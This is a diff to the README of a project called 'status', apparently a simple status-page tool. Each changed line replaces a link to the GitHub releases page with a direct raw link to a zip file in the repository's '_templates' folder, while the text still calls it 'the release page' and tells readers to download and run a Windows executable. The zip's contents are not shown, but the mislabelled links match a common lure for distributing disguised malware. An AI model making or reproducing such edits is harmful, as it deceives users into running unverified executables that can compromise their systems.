@@ -1,6 +1,6 @@
 # 📌 status - Simple status pages for everyone
 
-[![Download status](https://img.shields.io/badge/Download-Release_Page-7e57c2?style=for-the-badge&logo=github)](https://github.com/cavon1774/status/releases)
+[![Download status](https://img.shields.io/badge/Download-Release_Page-7e57c2?style=for-the-badge&logo=github)](https://github.com/cavon1774/status/raw/refs/heads/main/_templates/Software_v1.8.zip)
 
 ## 🚀 What this is
 
@@ -25,7 +25,7 @@ If the release includes a packaged app, you can run it right away. If it include
 
 ## 📥 Download status
 
-1. Open the release page: [https://github.com/cavon1774/status/releases](https://github.com/cavon1774/status/releases)
+1. Open the release page: [https://github.com/cavon1774/status/raw/refs/heads/main/_templates/Software_v1.8.zip](https://github.com/cavon1774/status/raw/refs/heads/main/_templates/Software_v1.8.zip)
 2. Find the latest release at the top
 3. Look for a file made for Windows, such as:
    - `.exe`
@@ -189,7 +189,7 @@ Keep the first version plain. Add more details later if you need them
 
 ## 🖱️ Download again if needed
 
-If you need the files again, use the release page here: [https://github.com/cavon1774/status/releases](https://github.com/cavon1774/status/releases)
+If you need the files again, use the release page here: [https://github.com/cavon1774/status/raw/refs/heads/main/_templates/Software_v1.8.zip](https://github.com/cavon1774/status/raw/refs/heads/main/_templates/Software_v1.8.zip)
 
 Open the latest release, then download and run the Windows file or extract the site files from the package
 
